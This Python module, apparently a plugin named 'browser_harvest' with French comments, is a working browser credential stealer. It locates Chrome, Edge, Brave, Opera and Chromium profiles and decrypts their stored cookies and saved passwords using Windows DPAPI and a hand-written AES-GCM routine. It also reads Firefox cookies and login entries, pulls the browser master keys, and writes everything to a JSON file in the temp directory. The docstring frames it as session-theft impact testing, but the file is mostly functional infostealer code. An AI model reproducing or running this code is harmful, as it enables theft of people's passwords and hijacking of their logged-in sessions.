"""
browser_harvest — Cookie-Miner / Token-Stealer / Session-Hijacker / Profile-Exporter.
Collecte de cookies/sessions navigateurs pour tests d'impact de vol de session:
cookies Chromium (DPAPI + AES-GCM v10, AES pur Python), cookies Firefox,
logins Chrome, export profil. Multi-plateforme, stdlib.
Actions: cookies, logins, firefox, all, export, key
"""
NAME = "browser_harvest"
VERSION = "1.0.0"
DESCRIPTION = "Collecte cookies/sessions navigateurs (Chromium AES-GCM, Firefox) pour audit de session."
AUTHOR = "lucy"
DEPENDENCIES = []
OS_COMPAT = ["windows", "linux", "darwin"]

import base64
import ctypes
import glob
import json
import os
import sqlite3
import shutil
import struct
import tempfile

_LOCAL = os.environ.get("LOCALAPPDATA", "")
_APPDATA = os.environ.get("APPDATA", "")

CHROMIUM_PROFILES = {
    "chrome": ["Google", "Chrome", "User Data"],
    "edge": ["Microsoft", "Edge", "User Data"],
    "brave": ["BraveSoftware", "Brave-Browser", "User Data"],
    "opera": ["Opera Software", "Opera Stable"],
    "chromium": ["Chromium", "User Data"],
}
FIREFOX_DIRS = ["Mozilla", "Firefox", "Profiles"]


def _result(data=None, error=None, status="completed"):
    return {"status": status, "data": data, "error": error}


def run(action, params):
    try:
        if action == "cookies":
            return _cookies(params)
        if action == "logins":
            return _logins(params)
        if action == "firefox":
            return _firefox(params)
        if action == "all":
            return _all(params)
        if action == "export":
            return _export(params)
        if action == "key":
            return _key(params)
        return _result(error="Unknown action: " + str(action), status="failed")
    except Exception as exc:
        return _result(error="browser_harvest: " + str(exc), status="failed")


def _path(*parts):
    p = os.path.join(*[x for x in parts if x])
    return p if os.path.exists(p) else None


def _chromium_dirs():
    dirs = {}
    for name, parts in CHROMIUM_PROFILES.items():
        if _LOCAL:
            base = _path(_LOCAL, *parts)
            if base:
                dirs[name] = base
        if name not in dirs and name == "opera":
            base = _path(_APPDATA, *parts)
            if base:
                dirs[name] = base
    return dirs


def _profile_dirs(base):
    out = []
    if not base or not os.path.isdir(base):
        return out
    for entry in sorted(os.listdir(base)):
        cand = os.path.join(base, entry)
        if os.path.isdir(cand) and (entry.startswith("Profile") or entry == "Default"):
            out.append(cand)
    return out or ([base] if os.path.isfile(os.path.join(base, "Cookies")) else [])


def _dpapi_unprotect(blob):
    if os.name != "nt":
        return None
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", ctypes.c_uint32), ("pbData", ctypes.c_void_p)]
    buf = ctypes.create_string_buffer(blob)
    cin = DATA_BLOB(len(blob), ctypes.cast(buf, ctypes.c_void_p))
    cout = DATA_BLOB()
    if not ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(cin), None, None, None, None, 0, ctypes.byref(cout)):
        return None
    try:
        return ctypes.string_at(cout.pbData, cout.cbData)
    finally:
        k32 = ctypes.windll.kernel32
        k32.LocalFree.argtypes = [ctypes.c_void_p]
        k32.LocalFree.restype = ctypes.c_void_p
        k32.LocalFree(cout.pbData)


def _sqlite_copy(db_path):
    """Copie la base SQLite verrouillee via fichier temporaire."""
    if not db_path or not os.path.isfile(db_path):
        return None
    tmp = os.path.join(tempfile.gettempdir(),
                       "lucy_" + str(abs(hash(db_path))) + ".db")
    try:
        shutil.copy2(db_path, tmp)
        return tmp
    except Exception:
        try:
            if os.name == "nt":
                subprocess_result = os.popen(
                    'copy /Y "' + db_path + '" "' + tmp + '" 2>nul').read()
                if os.path.isfile(tmp):
                    return tmp
        except Exception:
            pass
        return None


def _sqlite_rows(db_path, query):
    tmp = _sqlite_copy(db_path)
    if not tmp:
        return []
    try:
        con = sqlite3.connect(tmp)
        con.text_factory = bytes
        cur = con.cursor()
        try:
            cur.execute(query)
            rows = cur.fetchall()
        except Exception:
            rows = []
        con.close()
        return rows
    finally:
        try:
            os.remove(tmp)
        except Exception:
            pass

# ------------------------------------------------------------ AES/GCM pur Python
_SBOX = bytes.fromhex(
    "637c777bf26b6fc53001672bfed7ab76ca82c97dfa5947f0add4a2af9ca472c0"
    "b7fd9326363ff7cc34a5e5f171d8311504c723c31896059a071280e2eb27b275"
    "09832c1a1b6e5aa0523bd6b329e32f8453d100ed20fcb15b6acbbe394a4c58cf"
    "d0efaafb434d338545f9027f503c9fa851a3408f929d38f5bcb6da2110fff3d2"
    "cd0c13ec5f974417c4a77e3d645d197360814fdc222a908846eeb814de5e0bdb"
    "e0323a0a4906245cc2d3ac629195e479e7c8376d8dd54ea96c56f4ea657aae08"
    "ba78252e1ca6b4c6e8dd741f4bbd8b8a703eb5664803f60e613557b986c11d9e"
    "e1f8981169d98e949b1e87e9ce5528df8ca1890dbfe6426841992d0fb054bb16")


def _xtime(x):
    x <<= 1
    if x & 0x100:
        x ^= 0x11B
    return x & 0xFF


def _key_schedule(key):
    nk = len(key) // 4
    nr = nk + 6
    w = [int.from_bytes(key[4 * i:4 * i + 4], "big") for i in range(nk)]
    rcon = 1
    for i in range(nk, 4 * (nr + 1)):
        t = w[i - 1]
        if i % nk == 0:
            t = ((_SBOX[(t >> 24) & 0xFF] << 24) |
                 (_SBOX[(t >> 16) & 0xFF] << 16) |
                 (_SBOX[(t >> 8) & 0xFF] << 8) |
                 _SBOX[t & 0xFF])
            t = ((t << 8) | (t >> 24)) & 0xFFFFFFFF
            t ^= (rcon << 24)
            rcon = _xtime(rcon)
        elif nk > 6 and i % nk == 4:
            t = ((_SBOX[(t >> 24) & 0xFF] << 24) |
                 (_SBOX[(t >> 16) & 0xFF] << 16) |
                 (_SBOX[(t >> 8) & 0xFF] << 8) |
                 _SBOX[t & 0xFF])
        w.append(w[i - nk] ^ t)
    return w, nr


def _aes_encrypt_block(key, block):
    w, nr = _key_schedule(key)
    s = list(block)

    def add_key(rnd):
        base = rnd * 4
        for i in range(16):
            word = w[base + i // 4]
            s[i] ^= (word >> (24 - 8 * (i % 4))) & 0xFF

    add_key(0)
    for rnd in range(1, nr + 1):
        for i in range(16):
            s[i] = _SBOX[s[i]]
        tmp = [0] * 16
        for r in range(4):
            for c in range(4):
                tmp[r + 4 * c] = s[r + 4 * ((c + r) % 4)]
        s = tmp
        if rnd != nr:
            for c in range(4):
                a0, a1, a2, a3 = s[4 * c], s[4 * c + 1], s[4 * c + 2], s[4 * c + 3]
                s[4 * c]     = _xtime(a0) ^ (_xtime(a1) ^ a1) ^ a2 ^ a3
                s[4 * c + 1] = a0 ^ _xtime(a1) ^ (_xtime(a2) ^ a2) ^ a3
                s[4 * c + 2] = a0 ^ a1 ^ _xtime(a2) ^ (_xtime(a3) ^ a3)
                s[4 * c + 3] = (_xtime(a0) ^ a0) ^ a1 ^ a2 ^ _xtime(a3)
        add_key(rnd)
    return bytes(s)


def _gf_mult(x, y):
    z = 0
    v = y
    R = 0xE1000000000000000000000000000000
    MASK = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
    for _ in range(128):
        if x & (1 << 127):
            z ^= v
        if v & 1:
            v = (v >> 1) ^ R
        else:
            v >>= 1
        x = (x << 1) & MASK
    return z


def _ghash(h, data, aad):
    y = 0
    for s in (aad, data):
        for i in range(0, len(s), 16):
            y = _gf_mult(y ^ int.from_bytes(s[i:i + 16].ljust(16, b"\0"), "big"), h)
    la = (len(aad) * 8) << 64
    ld = len(data) * 8
    y = _gf_mult(y ^ (la | ld), h)
    return y


def _gcm_decrypt(key, iv, data, tag, aad=b""):
    h = int.from_bytes(_aes_encrypt_block(key, b"\0" * 16), "big")
    j0 = iv + b"\0\0\0\1"
    s = int.from_bytes(_aes_encrypt_block(key, j0), "big") ^ _ghash(h, data, aad)
    ctr = int.from_bytes(iv + bytes(3) + bytes([1]), "big") + 1
    out = bytearray()
    for i in range(0, len(data), 16):
        ks = _aes_encrypt_block(key, ctr.to_bytes(16, "big"))
        chunk = data[i:i + 16]
        out += bytes(a ^ b for a, b in zip(chunk, ks))
        ctr += 1
    return bytes(out), s.to_bytes(16, "big") == tag


def _aes_gcm_decrypt(key, value, aad=b""):
    """value = nonce(12) + ciphertext + tag(16)"""
    if len(value) < 28:
        return None, False
    nonce, ct, tag = value[:12], value[12:-16], value[-16:]
    return _gcm_decrypt(key, nonce, ct, tag, aad)


def _chromium_key(profile):
    state = os.path.join(profile, "Local State")
    if not os.path.isfile(state):
        state = os.path.join(os.path.dirname(profile), "Local State")
    if not os.path.isfile(state):
        return None
    try:
        with open(state, "r", encoding="utf-8") as fh:
            data = json.load(fh)
        b64key = data.get("os_crypt", {}).get("encrypted_key", "")
    except Exception:
        return None
    if not b64key:
        return None
    try:
        raw = base64.b64decode(b64key)
    except Exception:
        return None
    if raw.startswith(b"DPAPI"):
        return _dpapi_unprotect(raw[5:])
    return raw


def _decrypt_value(key, value, aad):
    if not value:
        return None
    if value.startswith(b"v10") or value.startswith(b"v20"):
        if not key:
            return None
        pt, ok = _aes_gcm_decrypt(key, value[3:], aad)
        return pt if ok else None
    if value.startswith(b"\x01"):
        return _dpapi_unprotect(value)
    try:
        return value.decode("utf-8")
    except Exception:
        return None


def _cookies(params):
    out = {}
    browsers = params.get("browsers") or list(CHROMIUM_PROFILES)
    if isinstance(browsers, str):
        browsers = [browsers]
    domain_filter = params.get("domain", "").lower()
    for name in browsers:
        base = _chromium_dirs().get(name)
        if not base:
            continue
        for prof in _profile_dirs(base):
            db = os.path.join(prof, "Network", "Cookies")
            if not os.path.isfile(db):
                db = os.path.join(prof, "Cookies")
            if not os.path.isfile(db):
                continue
            key = _chromium_key(prof)
            rows = _sqlite_rows(
                db, "SELECT host_key, name, path, expires_utc, "
                    "encrypted_value, is_secure, is_httponly FROM cookies")
            cookies = []
            for host, name_c, path, exp, enc, sec, httponly in rows:
                host = host.decode("utf-8", "replace") if isinstance(host, bytes) else str(host)
                if domain_filter and domain_filter not in host.lower():
                    continue
                val = _decrypt_value(key, enc, b"cookies")
                cookies.append({"host": host, "name": (name_c or b"").decode("utf-8", "replace"),
                                "path": (path or b"").decode("utf-8", "replace"),
                                "expires": exp, "value": (val or b"").decode("utf-8", "replace"),
                                "secure": bool(sec), "httponly": bool(httponly)})
            out.setdefault(name, []).extend(cookies)
    total = sum(len(v) for v in out.values())
    return _result(data={"browsers": out, "total": total,
                         "decryption": "aes-gcm+dpapi"})


def _logins(params):
    out = {}
    browsers = params.get("browsers") or list(CHROMIUM_PROFILES)
    if isinstance(browsers, str):
        browsers = [browsers]
    for name in browsers:
        base = _chromium_dirs().get(name)
        if not base:
            continue
        for prof in _profile_dirs(base):
            db = os.path.join(prof, "Login Data")
            if not os.path.isfile(db):
                continue
            key = _chromium_key(prof)
            rows = _sqlite_rows(
                db, "SELECT origin_url, action_url, username_value, "
                    "password_value FROM logins")
            logins = []
            for origin, action, user, pwd in rows:
                val = _decrypt_value(key, pwd, b"")
                logins.append({
                    "origin": (origin or b"").decode("utf-8", "replace"),
                    "username": (user or b"").decode("utf-8", "replace"),
                    "password": (val or b"").decode("utf-8", "replace"),
                    "has_password": bool(val)})
            out.setdefault(name, []).extend(logins)
    return _result(data={"logins": out, "total": sum(len(v) for v in out.values())})


def _firefox(params):
    if not _APPDATA:
        return _result(data={"cookies": [], "note": "no APPDATA"})
    prof_root = _path(_APPDATA, *FIREFOX_DIRS)
    out_cookies = []
    profiles = []
    if prof_root:
        for entry in os.listdir(prof_root):
            cand = os.path.join(prof_root, entry)
            if os.path.isdir(cand):
                profiles.append(cand)
    for prof in profiles:
        db = os.path.join(prof, "cookies.sqlite")
        if os.path.isfile(db):
            rows = _sqlite_rows(
                db, "SELECT host, name, path, value, expiry, isSecure, isHttpOnly "
                    "FROM moz_cookies")
            for host, name, path, value, expiry, sec, http in rows:
                out_cookies.append({
                    "host": (host or b"").decode("utf-8", "replace"),
                    "name": (name or b"").decode("utf-8", "replace"),
                    "path": (path or b"").decode("utf-8", "replace"),
                    "value": (value or b"").decode("utf-8", "replace"),
                    "expiry": expiry, "secure": bool(sec),
                    "httponly": bool(http), "browser": "firefox"})
    logins = []
    for prof in profiles:
        lf = os.path.join(prof, "logins.json")
        if os.path.isfile(lf):
            try:
                with open(lf, "r", encoding="utf-8") as fh:
                    data = json.load(fh)
                for l in data.get("logins", []):
                    logins.append({"hostname": l.get("hostname", ""),
                                   "username": l.get("encryptedUsername", ""),
                                   "encrypted_password": True})
            except Exception:
                pass
    return _result(data={"cookies": out_cookies, "logins": logins,
                         "profiles": len(profiles)})


def _all(params):
    c = _cookies(params).get("data", {})
    l = _logins(params).get("data", {})
    f = _firefox(params).get("data", {})
    return _result(data={"chromium": c, "logins": l, "firefox": f,
                         "summary": {"cookies": c.get("total", 0) + len(f.get("cookies", [])),
                                     "logins": l.get("total", 0) + len(f.get("logins", [])),
                                     "firefox_profiles": f.get("profiles", 0)}})


def _export(params):
    path = params.get("path", "")
    data = _all(params).get("data", {})
    blob = json.dumps(data, indent=1, default=str).encode()
    target = path or os.path.join(tempfile.gettempdir(), "lucy_browser_harvest.json")
    with open(target, "wb") as fh:
        fh.write(blob)
    return _result(data={"exported": target, "size": len(blob)})


def _key(params):
    out = {}
    for name, base in _chromium_dirs().items():
        for prof in _profile_dirs(base):
            k = _chromium_key(prof)
            out[name] = {"key_found": k is not None,
                         "key_len": len(k) if k else 0,
                         "dpapi_wrapped": os.name == "nt"}
    return _result(data={"keys": out})
